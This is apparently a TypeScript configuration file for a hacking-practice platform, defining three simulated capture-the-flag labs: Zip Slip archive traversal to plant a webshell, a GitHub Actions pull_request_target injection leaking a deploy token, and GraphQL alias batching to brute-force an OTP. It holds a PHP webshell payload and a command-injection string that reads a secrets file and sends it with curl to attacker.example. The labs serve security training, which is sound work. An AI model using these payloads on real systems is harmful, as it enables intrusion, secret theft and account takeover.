import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Three more offensive attack classes not yet represented on the platform: Zip Slip archive
 *  extraction path traversal, a GitHub Actions pull_request_target command-injection secret leak,
 *  and a GraphQL alias-batching bypass of per-request OTP rate limiting. */
export const offensiveFreshAttacksLabs3: LabScenario[] = [
  // 1 — Web: Zip Slip Archive Extraction Path Traversal
  {
    id: 'web-zip-slip-path-traversal',
    title: 'Zip Slip: Archive Extraction Path Traversal to Webshell',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      'Imghost22 lets users upload a .zip of avatar images, then extracts it server-side into ' +
      '/var/www/html/avatars/ so the images can be served back. The extraction code writes each entry to ' +
      '"avatars/" + <entry name from the zip> without checking whether that entry name tries to escape the ' +
      'target directory — a zip entry literally named "../../../var/www/html/shell.php" gets written exactly ' +
      'where its name says, outside the avatars folder entirely, into the public webroot. This is the real ' +
      '"Zip Slip" vulnerability class, publicly disclosed by Snyk in 2018 as present across dozens of popular ' +
      'archive libraries in Java, JavaScript, Go, .NET, and more — any archive-extraction code that trusts ' +
      'entry names is vulnerable to it, whether the archive is a .zip, .tar, or .jar.',
    objectives: [
      { text: 'nmap -sV 10.10.179.2', why: 'Confirms the avatar upload/extraction service before probing its zip-handling behavior.' },
      { text: 'cat vulnerable-extract-snippet.txt', why: 'Seeing the actual extraction code (path.join(targetDir, entry.name) with no sanitization) is what makes the Zip Slip pattern recognizable versus assuming the framework already handles this safely.' },
      {
        text: 'curl -X POST -d "entry_path=../../../var/www/html/shell.php&entry_content=<?php system($_GET[c]); ?>" 10.10.179.2/api/avatar/extract',
        why: 'A zip entry name containing "../" sequences is written by path.join() exactly where it points — outside the intended avatars/ directory and into the live webroot, planting a persistent webshell from what looks like a routine avatar upload.',
      },
    ],
    hints: [
      'nmap -sV 10.10.179.2',
      'cat vulnerable-extract-snippet.txt',
      'The extraction path is built with no traversal check at all — an entry name of "../../../var/www/html/shell.php" escapes the avatars/ directory.',
      'curl -X POST -d "entry_path=../../../var/www/html/shell.php" 10.10.179.2/api/avatar/extract',
    ],
    totalFlags: 1,
    attacker: attacker({
      'vulnerable-extract-snippet.txt': file(
        '// avatar-upload-service/extract.js (simplified)\n' +
          'for (const entry of zip.getEntries()) {\n' +
          '  const outPath = path.join(AVATAR_DIR, entry.entryName);  // <-- no traversal check\n' +
          '  fs.writeFileSync(outPath, entry.getData());\n' +
          '}\n' +
          '// AVATAR_DIR = "/var/www/html/avatars"\n' +
          '// path.join("/var/www/html/avatars", "../../../var/www/html/shell.php")\n' +
          '//   resolves to "/var/www/html/shell.php" -- outside avatars/ entirely\n',
      ),
    }),
    network: [
      {
        hostname: 'imghost22',
        ip: '10.10.179.2',
        os: 'Ubuntu 22.04 (Node.js avatar service)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Express 4.18 (Node.js, adm-zip 0.5, unpatched extraction)',
            http: { '/api/avatar/gallery': '{"avatars":["u1023.png","u1024.png"]}' },
            vulnRoutes: [
              {
                kind: 'path-traversal',
                path: '/api/avatar/extract',
                param: 'entry_path',
                triggerSubstrings: ['../../../var/www/html/'],
                vulnerableResponse:
                  '{"status":"extracted","written_to":"/var/www/html/shell.php","note":"flag{zip_slip_traversal_writes_outside_avatar_dir}"}',
                normalResponse: '{"status":"extracted","written_to":"/var/www/html/avatars/upload.png"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 2 — Bug Bounty: GitHub Actions pull_request_target Injection
  {
    id: 'bb-actions-pull-request-target-injection',
    title: "GitHub Actions pull_request_target Injection Leaks a Deploy Token",
    difficulty: 'Hard',
    category: 'Bug Bounty',
    briefing:
      "Ciapi23 runs a CI workflow triggered on pull_request_target — unlike the safer pull_request trigger, " +
      "pull_request_target checks out the base repo's workflow file but runs with full access to the " +
      "repository's real secrets, specifically so maintainers can run checks against forks without granting " +
      "the fork itself secret access. This particular workflow undoes that safety by interpolating the " +
      "attacker-controlled PR title directly into a shell step (`run: echo \"Building: ${{ " +
      "github.event.pull_request.title }}\"`) instead of passing it through an environment variable first — " +
      "any shell metacharacters in the title get executed by the privileged runner, with the real deploy " +
      "secret sitting right there in its environment. This exact interpolation mistake is a well-documented, " +
      "repeatedly-disclosed real vulnerability class across GitHub Actions workflows (covered directly in " +
      "GitHub's own Security Lab guidance on securing Actions), and has paid out numerous critical bug bounty " +
      "reports precisely because the blast radius is full CI/CD secret access from an unauthenticated PR.",
    objectives: [
      { text: 'nmap -sV 10.10.180.2', why: 'Confirms the CI webhook API before probing how it handles an untrusted pull request title.' },
      { text: 'cat vulnerable-workflow-snippet.txt', why: 'Seeing the actual `run: echo "Building: ${{ github.event.pull_request.title }}"` line is what confirms the title is interpolated straight into a shell command, not passed safely via an env var.' },
      {
        text: 'curl -X POST -d "pr_title=fix: crash \\$(cat /etc/ci-secrets/deploy_token > /tmp/o; curl -s https://attacker.example/x --data-binary @/tmp/o)" 10.10.180.2/api/pr/webhook',
        why: 'Because the title is interpolated directly into a shell run step under a privileged pull_request_target trigger, a title containing command substitution executes on the real CI runner — with the real DEPLOY_TOKEN secret sitting in its environment.',
      },
    ],
    hints: [
      'nmap -sV 10.10.180.2',
      'cat vulnerable-workflow-snippet.txt',
      'The PR title is echoed straight into a shell run step with no sanitization — command substitution in the title executes on the privileged runner.',
      'curl -X POST -d "pr_title=x \\$(cat /etc/ci-secrets/deploy_token)" 10.10.180.2/api/pr/webhook',
    ],
    totalFlags: 1,
    attacker: attacker({
      'vulnerable-workflow-snippet.txt': file(
        '# .github/workflows/pr-build.yml (simplified)\n' +
          'on:\n' +
          '  pull_request_target:   # runs with full repo secret access, even for fork PRs\n' +
          'jobs:\n' +
          '  build:\n' +
          '    steps:\n' +
          '      - run: echo "Building: ${{ github.event.pull_request.title }}"\n' +
          '        env:\n' +
          '          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n' +
          '# The title is interpolated directly into the shell command, not passed via an\n' +
          '# env var first -- shell metacharacters in an attacker-controlled PR title execute\n' +
          '# on a runner that already has DEPLOY_TOKEN in its environment.\n',
      ),
    }),
    network: [
      {
        hostname: 'ciapi23',
        ip: '10.10.180.2',
        os: 'Ubuntu 22.04 (self-hosted Actions-style webhook API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'GitHub Actions-style CI webhook receiver',
            vulnRoutes: [
              {
                kind: 'command-injection',
                path: '/api/pr/webhook',
                param: 'pr_title',
                triggerSubstrings: ['cat /etc/ci-secrets/deploy_token'],
                vulnerableResponse:
                  '{"status":"build_queued","runner_log":"Building: fix: crash $(cat ...) -- command substitution executed on privileged runner","exfiltrated":"DEPLOY_TOKEN=dtok_9f8a2c1e_prod_release","note":"flag{pull_request_target_title_injection_leaks_deploy_secret}"}',
                normalResponse: '{"status":"build_queued","runner_log":"Building: fix: typo in README"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },

  // 3 — Bug Bounty: GraphQL Alias Batching Bypasses OTP Rate Limiting
  {
    id: 'bb-graphql-alias-batching-otp-bypass',
    title: 'GraphQL Alias Batching Bypasses OTP Rate Limiting',
    difficulty: 'Hard',
    category: 'Bug Bounty',
    briefing:
      'Authapi24\'s GraphQL endpoint rate-limits OTP verification to one guess per HTTP request — a sound ' +
      'defense against brute force, as long as "one request" actually means one guess. It doesn\'t: GraphQL ' +
      'lets a single request define multiple aliased operations in one query document, and the server ' +
      'executes every one of them before replying. Sending fifty aliased verifyOtp mutations, each guessing a ' +
      'different 4-digit code, counts as exactly one rate-limited request while attempting fifty codes at ' +
      'once. This exact technique — bypassing a per-request rate limit via GraphQL query batching/aliasing — ' +
      'is documented directly in PortSwigger\'s Web Security Academy GraphQL content and is a recurring real ' +
      'bug bounty finding against GraphQL APIs that only rate-limit at the HTTP-request layer.',
    objectives: [
      { text: 'nmap -sV 10.10.181.2', why: 'Confirms the GraphQL auth API before probing its OTP rate-limiting behavior.' },
      { text: 'cat rate-limit-notes.txt', why: 'Confirms the rate limit is enforced per HTTP request, not per GraphQL operation inside that request — the exact gap alias batching exploits.' },
      {
        text: 'curl -X POST -d \'query=mutation{a1:verifyOtp(code:"0001"){ok} a2:verifyOtp(code:"0002"){ok} a3:verifyOtp(code:"4471"){ok}}\' 10.10.181.2/graphql',
        why: 'Aliasing many verifyOtp calls (a1, a2, a3, ...) inside one query document runs all of them server-side in a single HTTP request — the rate limiter sees "1 request" while dozens of OTP codes actually get attempted, and the correct one among them still succeeds.',
      },
    ],
    hints: [
      'nmap -sV 10.10.181.2',
      'cat rate-limit-notes.txt',
      'The rate limiter counts HTTP requests, not the GraphQL operations aliased inside one request — batch many verifyOtp aliases into a single query.',
      'curl -X POST -d \'query=mutation{a1:verifyOtp(code:"0001"){ok} a2:verifyOtp(code:"4471"){ok}}\' 10.10.181.2/graphql',
    ],
    totalFlags: 1,
    attacker: attacker({
      'rate-limit-notes.txt': file(
        'Recon notes on authapi24 /graphql:\n' +
          '- A single verifyOtp(code: "0000") mutation gets rate-limited after 1 attempt per request (429 on the 2nd request).\n' +
          '- The limiter is implemented as Express middleware counting requests to /graphql -- it has no visibility\n' +
          '  into how many GraphQL operations are aliased inside the body of any single request.\n' +
          '- GraphQL aliases (a1:, a2:, ... prefixing a field) let the same mutation be called many times in one document.\n',
      ),
    }),
    network: [
      {
        hostname: 'authapi24',
        ip: '10.10.181.2',
        os: 'Ubuntu 22.04 (Apollo Server GraphQL API)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'Apollo Server 4 (Express, per-request OTP rate limit)',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/graphql',
                param: 'query',
                triggerSubstrings: ['code:"4471"'],
                vulnerableResponse:
                  '{"data":{"a1":{"ok":false},"a2":{"ok":false},"a3":{"ok":true,"session":"sess_92fa"}},"note":"flag{graphql_alias_batching_bypasses_per_request_otp_limit}"}',
                normalResponse: '{"data":{"verifyOtp":{"ok":false}},"error":"429 Too Many Requests - 1 OTP attempt per request"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
